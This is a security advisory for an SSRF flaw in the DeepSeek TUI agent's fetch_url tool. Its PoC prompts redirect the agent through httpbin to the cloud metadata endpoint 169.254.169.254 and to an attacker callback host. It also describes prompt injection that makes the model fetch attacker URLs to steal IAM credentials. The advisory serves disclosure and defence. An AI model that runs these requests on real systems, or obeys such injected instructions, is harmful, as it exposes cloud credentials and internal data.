# [H] DeepSeek TUI has SSRF via HTTP Redirect Bypass in fetch_url Tool

## Summary
Severity: High
Advisory: GHSA-96ff-gc8g-wpvg
CVE: CVE-2026-45310
CWE: CWE-918
Ecosystem: crates.io, npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-96ff-gc8g-wpvg
Type: github-advisory

## Affected
- crates.io: `deepseek-tui` — affected >=0 <0.8.22
- crates.io: `deepseek-tui-cli` — affected >=0 <0.8.22
- npm: `deepseek-tui` — affected >=0 <0.8.22

## Details
### Summary
The `fetch_url` tool validates the initial URL's resolved IP address against a restricted-IP blocklist (`is_restricted_ip()`) to prevent SSRF attacks against internal services (cloud metadata endpoints, localhost, private networks). However, the HTTP client (`reqwest`) is configured to automatically follow up to 5 redirects (`reqwest::redirect::Policy::limited(5)`) without re-validating the redirect target against the same SSRF protections.

### PoC
**Step 1 — Baseline:** Confirm `fetch_url` blocks direct requests to restricted IPs.
```
Prompt: use fetch_url to fetch http://169.254.169.254/latest/meta-data/
Expected: Error — "restricted address (private/loopback/link-local)"
```

**Step 2 — SSRF bypass via redirect:** Fetch a public URL that redirects to the restricted IP.

```
Prompt: use fetch_url to fetch http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/&status_code=302
```

**Expected result:** The error message says "connection refused" or "request failed: connect error" — NOT "restricted address." This proves the SSRF filter was bypassed; the connection failed only because `169.254.169.254` is unreachable from a non-cloud machine.

**Observed result:** `fetch_url` followed the 302 redirect and attempted to connect to `169.254.169.254`. The error was a TCP-level connection failure, confirming the application-layer SSRF check was not applied to the redirect target.

**Step 3 — Redirect to attacker-controlled host:** Confirm attacker-controlled redirect targets are followed.

```
Prompt: use fetch_url to fetch http://httpbin.org/redirect-to?url=http://[collaborator-domain]/ssrf-redirect-bypass&status_code=302
Expected: Collaborator receives HTTP callback at /ssrf-redirect-bypass, confirming the redirect was followed.
```

### Impact
On cloud-hosted instances (AWS, GCP, Azure), an attacker can exfiltrate cloud IAM credentials, instance metadata, and other sensitive internal service data by redirecting `fetch_url` to `http://169.254.169.254/latest/meta-data/`. The attack is triggered via prompt injection (malicious instructions embedded in files or web content the model processes) that cause the model to call `fetch_url` with an attacker-controlled URL.

## References
- https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-96ff-gc8g-wpvg
- https://github.com/Hmbown/DeepSeek-TUI/security/advisories/GHSA-96ff-gc8g-wpvg
- https://nvd.nist.gov/vuln/detail/CVE-2026-45310
- https://github.com/Hmbown/DeepSeek-TUI
- https://github.com/Hmbown/DeepSeek-TUI/releases/tag/v0.8.22
